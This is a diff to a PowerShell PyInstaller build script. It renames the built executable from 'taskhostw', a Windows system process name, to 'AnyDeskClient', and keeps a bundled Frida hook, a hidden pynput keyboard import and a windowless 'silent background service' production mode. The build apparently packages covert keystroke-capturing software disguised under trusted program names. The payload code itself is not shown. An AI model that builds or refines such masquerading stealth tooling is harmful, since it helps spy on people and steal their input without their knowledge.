@@ -31,7 +31,7 @@ try {
 Write-Host "Cleaning previous builds"
 if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
 if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
-if (Test-Path "taskhostw.spec") { Remove-Item -Force "taskhostw.spec" }
+if (Test-Path "AnyDeskClient.spec") { Remove-Item -Force "AnyDeskClient.spec" }
 Write-Host ""
 
 # Build based on mode
@@ -41,7 +41,7 @@ if ($Dev) {
     
     pyinstaller --onefile `
                 --console `
-                --name taskhostw `
+                --name AnyDeskClient `
                 --icon windowprogram.ico `
                 --add-data "utils/frida_hook.js;utils" `
                 --hidden-import=pynput.keyboard._win32 `
@@ -65,7 +65,7 @@ if ($Dev) {
     Write-Host "  Build Complete (DEV MODE)"
     Write-Host "========================================"
     Write-Host ""
-    Write-Host "Output: dist\taskhostw.exe"
+    Write-Host "Output: dist\AnyDeskClient.exe"
     Write-Host "Dev Marker: dist\.dev_mode"
     Write-Host "Console: VISIBLE (for debugging)"
     Write-Host ""
@@ -78,7 +78,7 @@ if ($Dev) {
     
     pyinstaller --onefile `
                 --noconsole `
-                --name taskhostw `
+                --name AnyDeskClient `
                 --icon windowprogram.ico `
                 --add-data "utils/frida_hook.js;utils" `
                 --hidden-import=pynput.keyboard._win32 `
@@ -103,7 +103,7 @@ if ($Dev) {
     Write-Host "  Build Complete (PRODUCTION MODE)"
     Write-Host "========================================"
     Write-Host ""
-    Write-Host "Output: dist\taskhostw.exe"
+    Write-Host "Output: dist\AnyDeskClient.exe"
     Write-Host "Console: HIDDEN (silent background service)"
     Write-Host ""
     Write-Host "To install: .\install.ps1"
